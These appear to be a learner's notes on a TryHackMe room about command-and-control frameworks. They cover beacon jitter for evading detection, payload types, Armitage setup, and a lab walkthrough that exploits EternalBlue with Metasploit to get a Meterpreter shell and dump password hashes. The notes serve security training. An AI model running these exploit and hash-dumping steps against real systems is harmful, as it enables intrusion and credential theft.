# room
https://tryhackme.com/room/introtoc2

# task 1 - intro
* c2 - command and control

# task 2 - command and control framework structure
* c2 - command and control
* c2 framework - at the basic level a server that listens for many victim call backs for reverse shells
* c2 server - serves as a hub for agents to call back to
* c2 agent - calls back to the c2 server, reaches out to the c2 server for instruction, implements pseudo commands to make the operators life easier
* listener - application running on a c2 server waiting for a call back
* beacon - the process of a c2 agent calling back to the listener
* agent call back obfuscation
    * analysts, AV, and next gen firewalls look at the beacon rate to find a pattern
    * introducing jitter allows the beacon pattern to be more randomized
    * example
        ```
        import random

        sleep = 60
        jitter = random.randint(-30,30)
        sleep = sleep + jitter
        ```
* payload types
    * stageless payloads
        * simplest
        * contains full c2 agent
        * calls back to the c2 server and begins beaconing immediately
        * example
            * victim downloads and executes the dropper
            * beaconing to the c2 server begins
    * staged payloads
        * requires callback to c2 server to download additional parts of the c2 agent
        * the dropper is dropped onto the victim machine to download the second stage of the staged payload
        * easier to obfuscate code to bypass AV
        * example
            * victim downloads and executes the dropper
            * dropper calls back to c2 server for stage 2
            * c2 server sends stage 2 back to victim
            * stage 2 is loaded into memory on victim machine
            * c2 beaconing starts
* payload formats
    * powershell scripts
        * may contain c# code
    * hta files
    * jscript files
    * vba, vbs
    * ms office documents
* modules
    * modules are the core of a c2 framework and make it more extensible and flexible
    * post exploitation modules
        * modules that deal with anything after the initial point of compromise
    * pivoting modules
        * makes it easier to access restricted network segments
* other fundamentals
    * domain fronting
        * utilizes a known good host to hide the malicious host
            * cloudflare
    * c2 profiles
        * allows a user to control specific elements of the incoming HTTP request

# task 3 - common c2 frameworks
* free
    * metasploit
    * armitage
    * powershell empire / starkiller
    * covenant
    * sliver
* paid
    * cobalt strike
    * brute ratel
* resources
    * https://howto.thec2matrix.com/

# task 4 - setting up a c2 framework
* setting up armitage
    * cd /opt
    * git clone https://gitlab.com/kalilinux/packages/armitage.git
    * cd armitage
    * bash package.sh
    * ls -lrta ./release/unix
    * sudo systemctl start postgresql
    * msfdb delete
    * msfdb init
    * sudo /opt/armitage/release/unix/./teamserver 10.0.2.15 abc123
    * examples
        * teamserver - used to start the c2 server
        * armitage - used as the c2 agent

# task 5 - c2 operation basics
* c2 management interface should not be public
* ssh port forward
    * ssh -L 55553:127.0.0.1:55553 root@1.2.3.4
* listener types
    * standard listener - tcp or udp
    * http/https listeners - useful when traffic inspection is in place
    * dns listener - useful when a device cannot easily access the Intenet
    * smb listener - useful when network segments are restricted

# task 6 - practical
* practical
    * enumeration with nmap
        ```
        nmap -A -T4 -Pn 10.10.133.49 -oG nmap.txt
        ```
    * machine is vulnerable to eternal blue
        ```
        msfconsole
        search blue
        use 13
        options
        set rhosts 10.10.133.49
        set lhost tun0
        run
        ```
    * meterpreter shell
        ```
        meterpreter > sysinfo
        Computer        : TEDS-PC
        OS              : Windows 7 (6.1 Build 7600).
        Architecture    : x64
        System Language : en_US
        Domain          : WORKGROUP
        Logged On Users : 0
        Meterpreter     : x64/windows

        meterpreter > hashdump

        meterpreter > shell
        ```

# task 7 - advanced c2 setups
* redirectors
* redirector setup
    * rewrite
    * proxy
    * proxy_http
    * headers
* resources
    * msfvenom --list-options -p windows/meterpreter/reverse_http

# task 8 - conclusion
* conclusion